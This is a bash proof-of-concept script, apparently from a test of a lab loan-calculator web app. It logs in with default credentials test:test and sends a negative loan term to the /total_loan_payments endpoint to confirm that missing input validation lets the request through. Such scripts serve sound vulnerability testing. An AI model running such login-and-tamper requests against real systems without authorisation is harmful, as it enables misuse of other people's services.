#!/bin/bash

# POC: Calculation Logic Bypass - Negative Term Values Accepted
# This script demonstrates how the /total_loan_payments endpoint
# accepts negative term values without validation, producing invalid calculations

TARGET_HOST="localhost:32768"
LOGIN_ENDPOINT="/login"
CALC_ENDPOINT="/total_loan_payments"

echo "=== Calculation Logic Bypass - Negative Term POC ==="
echo ""

# Step 1: Authenticate using default credentials
echo "[*] Step 1: Authenticating with default credentials (test:test)"
AUTH_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "http://${TARGET_HOST}${LOGIN_ENDPOINT}" \
  -d "username=test&password=test" \
  -L)

if echo "$AUTH_RESPONSE" | grep -q "Loan Calculator"; then
    echo "[✓] Authentication successful"
else
    echo "[-] Authentication may have failed, continuing anyway..."
fi

echo ""

# Step 2: Test the calculation endpoint with negative term
echo "[*] Step 2: Testing calculation endpoint with negative term"

# Test parameters
PRINCIPAL="1000"
PAYMENT="100"
NEGATIVE_TERM="-10"

echo "[*] Target: http://${TARGET_HOST}${CALC_ENDPOINT}"
echo "[*] Parameters: principal=${PRINCIPAL}, payment=${PAYMENT}, term=${NEGATIVE_TERM}"
echo ""

# Make the request with authenticated session
RESPONSE=$(curl -s -b /tmp/cookies.txt "http://${TARGET_HOST}${CALC_ENDPOINT}?principal=${PRINCIPAL}&payment=${PAYMENT}&term=${NEGATIVE_TERM}")

echo "[*] Response:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Verify the vulnerability
if echo "$RESPONSE" | grep -q "total_loan_payments"; then
    TERM_VALUE=$(echo "$RESPONSE" | jq -r '.loan_term_amount' 2>/dev/null)
    TOTAL_VALUE=$(echo "$RESPONSE" | jq -r '.total_loan_payments' 2>/dev/null)
    
    if [ "$TERM_VALUE" = "-10" ]; then
        echo "[✓] VULNERABILITY CONFIRMED:"
        echo "    - Negative term value was accepted: $TERM_VALUE"
        echo "    - Invalid calculation produced: $TOTAL_VALUE"
        echo "    - This bypasses business logic for loan calculations"
        
        # Cleanup
        rm -f /tmp/cookies.txt
        exit 0
    fi
fi

echo "[-] Vulnerability not confirmed"
rm -f /tmp/cookies.txt
exit 1